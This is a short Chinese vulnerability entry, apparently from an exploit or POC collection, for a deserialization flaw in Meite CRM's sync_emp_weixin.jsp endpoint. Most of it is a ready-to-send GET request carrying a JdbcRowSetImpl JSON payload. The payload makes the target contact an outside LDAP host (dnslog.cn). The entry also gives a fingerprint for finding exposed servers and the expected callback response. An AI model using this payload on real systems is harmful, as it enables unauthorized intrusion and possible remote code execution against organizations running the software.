# 美特CRMsync_emp_weixin存在反序列化漏洞

美特 ｜ 反序列化 ｜ —
- **指纹**：`body="/common/scripts/basic.js"`
- **请求**：`GET /weixin/admin/sync_emp_weixin.jsp?emp_json=[{%22@type%22:%22[com.sun.rowset.JdbcRowSetImpl%22[{,%22dataSourceName%22:%22ldap://dnslog.cn%22,%22autoCommit%22:true}] HTTP/1.1`
- **响应特征**：200 dnslog回显